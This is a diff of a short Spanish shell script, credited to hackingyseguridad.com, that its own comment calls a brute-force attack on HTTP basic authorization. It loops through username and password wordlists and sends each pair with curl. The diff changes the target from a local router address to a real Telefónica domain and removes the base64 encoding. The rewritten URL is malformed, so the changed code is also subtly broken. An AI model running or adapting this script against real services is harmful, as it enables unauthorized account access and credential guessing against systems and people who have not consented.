@@ -1,5 +1,5 @@
 #!/bin/sh
-# Simple script de ataque fuerza bruta a http con autorizacion basica y credenciales codificadas en base64
+# Simple script de ataque fuerza bruta a http con autorizacion basica y credenciales
 # (c) hackingyseguridad.com 2021
 
 USERNAME_WORDLIST="usuarios.txt"
@@ -9,9 +9,9 @@ while IFS= read -r user
 do
     while IFS= read -r password
     do
-            credencial=$(printf "%s:%s" "$user" "$password" |base64 )
+            credencial=$(printf "%s:%s" "$user" "$password")
 
-curl -k -I -vvv  http://$credencial@192.168.1.1 \
+curl -k "https:/$credencial@edomus.telefonica.es/lt/" \
 -H 'Connection: keep-alive' \
 -H 'Upgrade-Insecure-Requests: 1' \
 -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36' \
